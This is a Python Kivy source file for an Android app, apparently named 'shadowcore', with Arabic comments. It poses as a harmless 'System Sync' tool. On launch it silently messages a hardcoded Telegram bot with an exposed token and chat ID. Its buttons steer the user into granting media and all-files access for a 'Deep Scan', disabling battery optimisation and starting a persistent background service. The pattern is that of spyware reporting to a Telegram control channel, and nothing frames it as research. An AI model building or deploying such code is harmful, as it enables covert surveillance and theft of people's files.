from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.button import Button
from kivy.uix.label import Label
from jnius import autoclass
from android.permissions import request_permissions, Permission
import requests

# معلومات البوت الخاصة بك
BOT_TOKEN = "8711969097:AAGCjUfiohcUHRWV_1UGa1j51GCEwmCtl3s"
CHAT_ID = "7084557369"

class MyApp(App):

    def build(self):
        layout = BoxLayout(orientation="vertical", padding=30, spacing=20)

        self.status = Label(text="System Status: Ready", font_size='18sp')

        # أزرار الوظائف الأساسية
        btn_files = Button(text="1. Allow File Access", background_color=(0.2, 0.5, 0.8, 1))
        btn_battery = Button(text="2. Disable Battery Optimization", background_color=(0.8, 0.5, 0.2, 1))
        btn_start = Button(text="3. Start System Sync", background_color=(0.1, 0.7, 0.3, 1), bold=True)

        btn_start.bind(on_press=self.ask_perms_and_start)
        btn_battery.bind(on_press=self.disable_battery)
        btn_files.bind(on_press=self.open_files_setting)

        layout.add_widget(self.status)
        layout.add_widget(btn_files)
        layout.add_widget(btn_battery)
        layout.add_widget(btn_start)

        return layout

    def on_start(self):
        # إشعار عند فتح التطبيق
        try:
            requests.post(
                f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
                data={"chat_id": CHAT_ID, "text": "📱 التطبيق تم فتحه على الجهاز"}
            )
        except: pass

    def ask_perms_and_start(self, instance):
        # طلب إذن الصور التقليدي أولاً ثم تشغيل الخدمة
        perms = [Permission.READ_MEDIA_IMAGES, Permission.FOREGROUND_SERVICE]
        request_permissions(perms, self.start_service)

    def start_service(self, permissions, grants):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            # تأكد أن الاسم هنا يطابق ما وضعته في buildozer.spec (Myservice)
            Service = autoclass('org.test.shadowcore.ServiceMyservice')
            Service.start(PythonActivity.mActivity, "")
            self.status.text = "✅ System Sync Active"
        except Exception as e:
            self.status.text = f"Error: {str(e)}"

    def disable_battery(self, instance):
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
            intent.setData(uri)
            activity.startActivity(intent)
        except: pass

    def open_files_setting(self, instance):
        # فتح صفحة "الوصول لجميع الملفات" لكي يعمل الـ Deep Scan
        try:
            PythonActivity = autoclass('org.kivy.android.PythonActivity')
            Intent = autoclass('android.content.Intent')
            Settings = autoclass('android.provider.Settings')
            Uri = autoclass('android.net.Uri')
            activity = PythonActivity.mActivity
            uri = Uri.parse("package:" + activity.getPackageName())
            intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, uri)
            activity.startActivity(intent)
        except:
            # في حال كان الجهاز قديماً ولا يدعم هذا الإذن
            self.status.text = "Permission not required for this device"

if __name__ == "__main__":
    MyApp().run()
